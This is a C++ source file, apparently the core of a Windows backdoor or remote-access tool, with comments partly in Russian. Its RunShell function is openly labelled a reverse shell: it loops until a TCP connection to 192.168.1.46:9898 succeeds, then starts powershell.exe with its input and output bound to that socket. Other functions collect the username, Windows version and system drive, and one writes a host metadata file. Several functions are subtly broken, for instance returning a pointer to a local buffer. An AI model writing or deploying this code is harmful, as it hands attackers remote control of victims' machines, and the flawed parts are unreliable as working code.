#include "Core.h"
/*
Author: Tragernout
Email: tragernout@yandex.ru
*/


static void RunShell() {
	/*
	Runs a Reverse Shell with powershell.
	*/
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	SOCKET sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

	constexpr auto SERVER = "192.168.1.46";
	constexpr auto PORT = 9898;

	SOCKADDR_IN sock_addr;
	sock_addr.sin_family = AF_INET;
	sock_addr.sin_port = htons(PORT);
	sock_addr.sin_addr.s_addr = inet_addr(SERVER);

	while (WSAConnect(sock, (SOCKADDR*)&sock_addr, sizeof(sock_addr), NULL, NULL, NULL, NULL) != 0);

	STARTUPINFOW sui; // Используется с функциями CreateProcess, чтобы определить оконный терминал и т.д.
	PROCESS_INFORMATION pi;

	memset(&sui, 0, sizeof(sui));
	sui.cb = sizeof(sui); // Размер структуры в байтах
	sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW); // STARTF_USESTDHANDLES - стандартный ввод-вывод
	sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)sock;

	WCHAR cmdLine[256] = L"powershell.exe";
	CreateProcessW(NULL, cmdLine, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
}

INT versionGet() {
	/*
	!!! NOT STABLE !!!
	Return windows version in INT.
	*/
	INT version = 0;
	// if (IsWindowsXPSP1OrGreater) ++version;
	// if (IsWindowsXPSP2OrGreater) ++version;
	if (IsWindowsXPOrGreater) ++version;		// 1 - Windows XP
	// if (IsWindowsVistaSP1OrGreater) ++version;
	// if (IsWindowsVistaSP2OrGreater) ++version;
	if (IsWindowsVistaOrGreater) ++version;		// 2 - Windows Vista
	if (IsWindows7OrGreater) ++version;			// 3 - Windows 7
	// if (IsWindows7SP1OrGreater) ++version;
	if (IsWindows8OrGreater) ++version;			// 4 - Windows 8
	if (IsWindows8Point1OrGreater) ++version;	// 5 - Windows 8.1
	if (IsWindows10OrGreater) ++version;		// 6 - Windows 10
	if (IsWindowsServer) ++version;				// 7 - Windows Server
	return version;
}

LPCWSTR userGet() {
	/*
	Returns username in LPCWSTR
	*/
	WCHAR username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserName(username, &username_len);
	return username;
}

LPCWSTR diskGet() {
	/*
	Returns disk name in LPCWSTR.
	*/
	CONST WCHAR* letters[] = { L"A:/", L"B:/", L"C:/", L"D:/", L"E:/", L"F:/", L"G:/", L"H:/", L"I:/", L"J:/", L"K:/", L"L:/", L"M:/", L"N:/", L"O:/", L"P:/", L"Q:/", L"R:/", L"S:/", L"T:/", L"U:/", L"V:/", L"W:/", L"X:/", L"Y:/", L"Z:/" };
	for (int i = 0; i < 26; ++i) {
		if (GetDriveType(letters[i]) == 3) {
			LPCWSTR final_disk = letters[i];
			LPCWSTR system32 = L"Windows/System32/";
			WCHAR buff[256] = L"";

			wcscat(buff, final_disk);
			wcscat(buff, system32);

			DWORD dwFileAttributes = GetFileAttributes(buff);
			if (dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY || dwFileAttributes == 22) {
				return final_disk;
			}
		}
	}
}

void createMetaFile(LPCWSTR username) {
	/*
	This func must create a file with host-meta, should be:
		Time when sesion started: 
		Username:
		Windows version:
	*/
	WCHAR pathToMetaFile[512] = L"C:\\Users\\";
	WCHAR addToPath[512] = L"\\Documents\\meta.txt";
	wcscat(pathToMetaFile, username);
	wcscat(pathToMetaFile, addToPath);
	std::cout << pathToMetaFile;
	std::ofstream metafile(pathToMetaFile);
	metafile << "123";
	metafile.close();
}